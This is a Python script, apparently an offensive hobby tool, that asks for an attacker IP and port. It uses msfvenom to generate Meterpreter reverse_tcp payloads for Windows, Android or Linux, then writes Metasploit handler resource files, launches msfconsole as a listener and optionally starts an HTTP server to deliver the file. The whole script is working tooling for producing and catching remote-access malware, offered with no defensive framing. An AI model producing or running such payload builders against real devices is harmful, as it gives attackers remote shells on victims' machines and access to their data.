import os, time

def main():
	ip = input("Atacker Ip -->> ")
	port = input("Listener Port -->> ")
	payload = input("Payload: android/linux/windows -->> ")
	name = input("File Name without .exe/.elf... -->> ")

	if payload == "windows":
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe >> "+name+".exe 2>/dev/null")
		print("Saved on "+name+".exe")

		listen = input("\nDo you want to start the listener? y/n -->> ")

		if listen == "y":
			os.system("rm windows.rb 2>/dev/null")
			os.system("echo 'use exploit/multi/handler' >> windows.rb")
			os.system("echo 'set LHOST "+ip+"' >> windows.rb")
			os.system("echo 'set LPORT "+port+"' >> windows.rb")
			os.system("echo 'set PAYLOAD windows/meterpreter/reverse_tcp' >> windows.rb")
			os.system("echo 'exploit' >> windows.rb")
			os.system("xterm -e msfconsole -r windows.rb &")

			http = input("Do you want to create a http server with python3? y/n -->> ")

			if http == "y":
				httpPort = input("http port -->> ")
				os.system("xterm -e python3 -m http.server "+httpPort+" ")

	if payload == "android":
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -o  "+name+".apk 2>/dev/null")
		print("Saved on "+name+".apk")

		listen = input("\nDo you want to start the listener? y/n -->> ")

		if listen == "y":
			os.system("rm android.rb 2>/dev/null")
			os.system("echo 'use exploit/multi/handler' >> android.rb")
			os.system("echo 'set LHOST "+ip+"' >> android.rb")
			os.system("echo 'set LPORT "+port+"' >> android.rb")
			os.system("echo 'set PAYLOAD android/meterpreter/reverse_tcp' >> android.rb")
			os.system("echo 'run' >> android.rb")
			os.system("xterm -e msfconsole -r android.rb &")

			http = input("Do you want to create a http server with python3? y/n -->> ")

			if http == "y":
				httpPort = input("http port -->> ")
				os.system("xterm -e python3 -m http.server "+httpPort+" ")

	if payload == "linux":
		os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf >> "+name+".elf 2>/dev/null")
		listen = input("\nDo you want to start the listener? y/n -->> ")
		
		if listen == "y":
			os.system("rm linux.rb 2>/dev/null && echo 'use exploit/multi/handler' >> linux.rb")
			os.system("echo 'set LHOST "+ip+"' >> linux.rb")
			os.system("echo 'set LPORT "+port+"' >> linux.rb")
			os.system("echo 'set PAYLOAD linux/x86/meterpreter/reverse_tcp' >> linux.rb")
			os.system("echo 'run' >> linux.rb")
			os.system("xterm -e msfconsole -r linux.rb &")

			http = input("Do you want to create a http server with python3? y/n -->> ")

			if http == "y":
				httpPort = input("http port -->> ")
				os.system("xterm -e python3 -m http.server "+httpPort+" ")

if __name__ == '__main__':
	main()
